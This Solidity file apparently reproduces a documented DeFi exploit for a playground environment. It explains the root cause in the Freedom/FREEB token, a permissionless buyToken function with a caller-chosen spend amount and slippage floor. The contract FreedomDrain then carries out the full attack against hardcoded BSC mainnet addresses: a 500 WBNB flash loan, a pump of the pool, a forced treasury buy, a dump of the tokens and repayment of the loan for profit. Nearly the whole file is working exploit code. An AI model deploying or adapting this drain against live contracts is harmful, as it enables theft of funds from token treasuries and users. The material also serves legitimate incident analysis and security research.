// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-Freedom).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the DODO flash-loan callback `DPPFlashLoanCall` lives on the test
// itself (`assetTo = address(this)`), and profit (WBNB) simply accumulates on
// the test contract's own balance, so there is no standalone contract to
// deploy. This file is a faithful, self-contained copy of that inline attack
// (testExploit body + DPPFlashLoanCall callback + minimal inline interfaces —
// no imports so it compiles anywhere), compiled inside the registry forge
// project. Logic and constants are copied verbatim from test/Freedom_exp.sol.
//
// Root cause: FREEB (a "market-cap management" proxy sidekick of the FREE
// token) exposes a PERMISSIONLESS buyToken(listingId, expectedPaymentAmount)
// that spends FREEB's own BNB treasury via PancakeSwap
// swapExactETHForTokens{value: listingId}(expectedPaymentAmount, [WBNB,FREE], FREEB, deadline).
// Both the spend amount (listingId) and the slippage floor
// (expectedPaymentAmount, forwarded as amountOutMin) are caller-supplied, and
// the swap prices off the live AMM spot reserve with no TWAP/oracle check. An
// attacker pumps the FREE/WBNB pool with a flash-loaned 500 WBNB, then calls
// buyToken(FREEB.balance, 5e18) to force the treasury to market-buy FREE at
// the inflated price with a near-zero minimum output, then dumps the
// pre-bought FREE back into the now WBNB-heavy pool for a ~74.15 WBNB profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFREEB {
    function buyToken(uint256 listingId, uint256 expectedPaymentAmount) external;
}

contract FreedomDrain {
    IERC20 constant FREE = IERC20(0x8A43Eb772416f934DE3DF8F9Af627359632CB53F);
    IFREEB constant FREEB = IFREEB(0xAE3ADa8787245977832c6DaB2d4474D3943527Ab);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter constant Router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPAdvanced constant DODO = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);

    address constant FREEBProxy = 0xAE3ADa8787245977832c6DaB2d4474D3943527Ab;

    // step 1: flash-borrow 500 WBNB from DODO's DPP (fee-free). The callback
    // below does the whole pump / treasury-drain / dump / repay sequence.
    function run() external {
        WBNB.approve(address(Router), type(uint256).max);
        DODO.flashLoan(500 * 1e18, 0, address(this), new bytes(1));
    }

    // DODO DPP flash-loan callback (DPPFlashLoanCall).
    function DPPFlashLoanCall(
        address, // sender
        uint256, // baseAmount
        uint256, // quoteAmount
        bytes calldata // data
    ) external {
        require(msg.sender == address(DODO), "Fail");

        FREE.approve(address(Router), type(uint256).max);

        // Pump: swap the full 500 WBNB into FREE, tripling FREE's spot price.
        WBNBTOTOKEN();

        // Force FREEB's treasury to buy FREE at the now-inflated price with a
        // throwaway 5 FREE minimum output — the vulnerable, unguarded call.
        FREEB.buyToken(FREEBProxy.balance, 5 * 1e18);

        // Dump the pre-bought FREE back into the now WBNB-heavy pool.
        TOKENTOWBNB();

        // Repay the 500 WBNB flash loan (fee-free); the remainder is profit.
        WBNB.transfer(address(DODO), 500 * 1e18);
    }

    function WBNBTOTOKEN() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(FREE);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function TOKENTOWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(FREE);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FREE.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    fallback() external payable {}
    receive() external payable {}
}
